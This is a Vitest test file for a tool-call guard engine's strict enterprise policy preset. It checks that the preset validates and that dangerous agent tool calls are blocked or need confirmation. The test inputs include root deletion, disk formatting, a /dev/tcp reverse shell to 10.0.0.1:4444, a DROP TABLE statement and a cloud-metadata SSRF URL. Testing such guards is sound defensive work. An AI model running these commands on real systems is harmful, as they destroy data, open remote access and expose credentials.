import { describe, it, expect } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import { SentinelEngine } from '../src/index.js';
import { validatePolicyConfig } from '../src/policy.js';
import { Verdict, ToolCallContext } from '../src/types.js';

describe('Strict Enterprise Zero-Trust Security Policy Preset (#188)', () => {
  const presetPath = path.resolve(__dirname, '../presets/enterprise-strict.policy.json');

  it('exists and contains valid JSON syntax', () => {
    expect(fs.existsSync(presetPath)).toBe(true);
    const rawContent = fs.readFileSync(presetPath, 'utf-8');
    const parsed = JSON.parse(rawContent);
    expect(parsed.version).toBe('1.0');
    expect(parsed.name).toContain('Enterprise Zero-Trust');
    expect(Array.isArray(parsed.rules)).toBe(true);
    expect(parsed.rules.length).toBeGreaterThanOrEqual(10);
  });

  it('passes strict schema validation via validatePolicyConfig()', () => {
    const rawContent = fs.readFileSync(presetPath, 'utf-8');
    const parsed = JSON.parse(rawContent);
    const validated = validatePolicyConfig(parsed);

    expect(validated.version).toBe('1.0');
    expect(validated.rules.length).toBe(parsed.rules.length);
    for (const rule of validated.rules) {
      expect(rule.id).toBeTruthy();
      expect(rule.name).toBeTruthy();
      expect(typeof rule.priority).toBe('number');
      expect(rule.action.verdict).toBeDefined();
    }
  });

  it('loads into SentinelEngine and blocks destructive commands', async () => {
    const rawContent = fs.readFileSync(presetPath, 'utf-8');
    const parsed = JSON.parse(rawContent);

    const engine = new SentinelEngine();
    engine.loadPolicy(parsed);

    // 1. Recursive Root Deletion
    const rmCtx: ToolCallContext = {
      id: 'test_rm',
      toolName: 'bash',
      params: { command: 'rm -rf /' },
      timestamp: Date.now()
    };
    const rmRes = await engine.evaluate(rmCtx);
    expect(rmRes.allowed).toBe(false);
    expect(rmRes.verdict).toBe(Verdict.BLOCK);
    expect(rmRes.violations[0].ruleId).toBe('ent-strict-block-root-rm');

    // 2. Raw Disk Formatting
    const mkfsCtx: ToolCallContext = {
      id: 'test_mkfs',
      toolName: 'terminal',
      params: { command: 'mkfs.ext4 /dev/sda1' },
      timestamp: Date.now()
    };
    const mkfsRes = await engine.evaluate(mkfsCtx);
    expect(mkfsRes.allowed).toBe(false);
    expect(mkfsRes.verdict).toBe(Verdict.BLOCK);

    // 3. Reverse Shell
    const revCtx: ToolCallContext = {
      id: 'test_rev',
      toolName: 'shell',
      params: { command: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' },
      timestamp: Date.now()
    };
    const revRes = await engine.evaluate(revCtx);
    expect(revRes.allowed).toBe(false);
    expect(revRes.verdict).toBe(Verdict.BLOCK);

    // 4. SQL Drop Table
    const dropCtx: ToolCallContext = {
      id: 'test_drop',
      toolName: 'query_database',
      params: { query: 'DROP TABLE customers;' },
      timestamp: Date.now()
    };
    const dropRes = await engine.evaluate(dropCtx);
    expect(dropRes.allowed).toBe(false);
    expect(dropRes.verdict).toBe(Verdict.BLOCK);

    // 5. Cloud Metadata SSRF
    const ssrfCtx: ToolCallContext = {
      id: 'test_ssrf',
      toolName: 'http_request',
      params: { url: 'http://169.254.169.254/latest/meta-data/' },
      timestamp: Date.now()
    };
    const ssrfRes = await engine.evaluate(ssrfCtx);
    expect(ssrfRes.allowed).toBe(false);
    expect(ssrfRes.verdict).toBe(Verdict.BLOCK);

    // 6. SQL Schema Alteration (Requires Confirmation)
    const alterCtx: ToolCallContext = {
      id: 'test_alter',
      toolName: 'query_database',
      params: { query: 'ALTER TABLE users ADD COLUMN role text;' },
      timestamp: Date.now()
    };
    const alterRes = await engine.evaluate(alterCtx);
    expect(alterRes.verdict).toBe(Verdict.CONFIRM);

    // 7. Legitimate Safe Tool Call Allowed
    const safeCtx: ToolCallContext = {
      id: 'test_safe',
      toolName: 'query_database',
      params: { query: 'SELECT id, email FROM users WHERE id = 42;' },
      timestamp: Date.now()
    };
    const safeRes = await engine.evaluate(safeCtx);
    expect(safeRes.allowed).toBe(true);
    expect(safeRes.verdict).toBe(Verdict.ALLOW);
  });
});
